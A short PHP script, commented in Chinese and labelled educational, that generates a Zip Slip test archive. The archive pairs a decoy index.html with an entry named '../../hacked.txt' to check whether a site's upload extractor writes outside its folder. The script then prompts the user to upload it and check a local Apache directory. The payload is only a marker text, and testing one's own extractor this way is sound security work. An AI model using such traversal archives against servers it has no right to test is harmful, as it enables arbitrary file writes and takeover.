<?php
/**
 * Zip Slip Attack Generator (For Educational/Testing Purposes ONLY)
 * This script creates a ZIP file where the internal filename contains "../" 
 * to test if the extraction logic is vulnerable to path traversal.
 */

$zip = new ZipArchive();
$filename = "zip_slip_test.zip";

if ($zip->open($filename, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
    die("Cannot create zip file");
}

// 建立一個正常的 index.html 以騙過系統驗證
$zip->addFromString("index.html", "<h1>Normal Content</h1>");

// 建立一個惡意路徑檔案
// 如果系統解壓到 uploads/videos/content_xxx/
// 那 ../../hacked.txt 將會落在 speech/hacked.txt
$zip->addFromString("../../hacked.txt", "Zip Slip Attack Successful! Your server root is vulnerable.");

$zip->close();

echo "攻擊測試包已生成: $filename\n";
echo "請到上傳頁面，上傳這個 $filename 試試看。\n";
echo "上傳成功後，檢查 c:\Apache24\htdocs\speech\ 目錄下是否出現了 hacked.txt。\n";
?>